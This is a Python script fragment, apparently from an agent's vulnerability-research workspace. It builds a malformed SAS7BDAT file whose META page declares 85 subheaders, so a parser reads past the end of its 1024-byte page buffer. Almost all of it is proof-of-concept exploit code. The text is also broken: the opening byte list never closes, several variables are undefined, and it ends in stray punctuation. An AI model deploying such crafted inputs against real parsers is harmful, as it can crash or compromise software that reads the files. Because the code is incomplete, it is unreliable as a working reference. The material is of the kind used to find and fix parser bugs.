magic = bytes([

endian = b'\x01'  # little endian
mystery3 = b'\x00'
file_format = b'1'  # unix format
mystery4 = b'\x00' * 30
encoding = b'\x1d'  # code 29 = ISO-8859-1
mystery5 = b'\x00' * 13
file_type = b'SAS FILE'
file_label = b'\x00' * 64
file_info = b'\x00' * 8

header_start = magic + a2 + mystery1 + a1 + mystery2 + endian + mystery3 + file_format + mystery4 + encoding + mystery5 + file_type + file_label + file_info

assert len(header_start) == 164

# After header_start, with pad1=0:
# creation_time (8 bytes double)
# modification_time (8 bytes double)
# seek 16 bytes
# header_size (4 bytes uint32)
# page_size (4 bytes uint32)
# page_count (4 bytes uint32) - 32-bit
# seek 8 bytes
# header_end (120 bytes)

creation_time = struct.pack('<d', 0.0)
modification_time = struct.pack('<d', 0.0)
skip16 = b'\x00' * 16
header_size = struct.pack('<I', 1024)
page_size = struct.pack('<I', 1024)
page_count = struct.pack('<I', 1)
skip8 = b'\x00' * 8

# header_end: release[8] + host[16] + version[16] + os_vendor[16] + os_name[16] + extra[48] = 120
release = b'9.0401M0'  # will parse as major=9, minor=401, revision=0 → NOT stat_transfer
host = b'W32_VSPRO\x00' + b'\x00' * 6
version = b'\x00' * 16
os_vendor = b'\x00' * 16
os_name = b'\x00' * 16
extra = b'\x00' * 48

header_end = release + host + version + os_vendor + os_name + extra
assert len(header_end) == 120

# Assemble the header content up to where we need
header_content = header_start + creation_time + modification_time + skip16 + header_size + page_size + page_count + skip8 + header_end
print(f"header_content size: {len(header_content)}")

header = header_content + b'\x00' * (1024 - len(header_content))
assert len(header) == 1024

# Page header for 32-bit: 24 bytes
# page_type at offset 16 (2 bytes): META = 0x0000
# subheader_count at offset 20 (2 bytes): set to 85 to overflow

page_data = bytearray(1024)

# Set page_type at offset 16 to META (0x0000) - already zero
# Set subheader_count at offset 20 to 85 (enough to overflow)
struct.pack_into('<H', page_data, 16, 0x0000)  # page_type = META
struct.pack_into('<H', page_data, 20, 85)  # subheader_count = 85

# Fill subheader pointers with len=0 so they're skipped
# (they're already zero which means len=0, so the inner check is skipped)
# This means the loop will iterate 85 times reading from shp pointers,
# and at iteration 83 it will read beyond the page buffer

# The full file
poc = bytes(header) + bytes(page_data)
print(f"Total PoC size: {len(poc)}")

with open('/workspace/poc.bin', 'wb') as f:
    f.write(poc)

print("PoC written to /workspace/poc.bin")"}
